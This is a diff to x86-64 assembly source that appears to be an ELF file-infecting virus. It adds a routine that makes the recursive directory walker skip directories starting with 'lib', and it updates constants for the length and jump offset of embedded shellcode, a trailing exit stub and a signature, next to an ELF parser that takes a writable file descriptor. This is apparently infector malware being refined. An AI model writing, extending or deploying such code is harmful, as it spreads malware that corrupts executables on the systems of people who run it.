@@ -499,6 +499,10 @@ list_files:
 			jne maybe_reg_file
 			cmp byte[r9 + 19], '.'
 			je skip_file
+			mov rdi, rsi
+			call check_lib;skip dir lib
+			cmp rax, 0
+			jne skip_file
 			mov rdi, rsi; pass fname as arg
 			call handle_dir
 			jmp skip_file
@@ -521,6 +525,25 @@ list_files:
 	add rsp, 4
 	add rsp,1024
 
+retn
+
+;check_lib(char *dir_name)
+check_lib:
+	xor rax, rax
+	cmp byte[rdi], 0
+	je cl_exit
+	cmp byte[rdi], 'l'
+	jne cl_exit
+	cmp byte[rdi + 1], 0
+	je cl_exit
+	cmp byte[rdi + 1], 'i'
+	jne cl_exit
+	cmp byte[rdi + 2], 0
+	je cl_exit
+	cmp byte[rdi + 2], 'b'
+	jne cl_exit
+	mov rax, 1
+	cl_exit:
 retn
 
 ;void handle_dir(char *fname)
@@ -988,9 +1011,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6525 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6474; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6469 
+%define SHELLCODE_LEN 6585 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6534; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6529 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
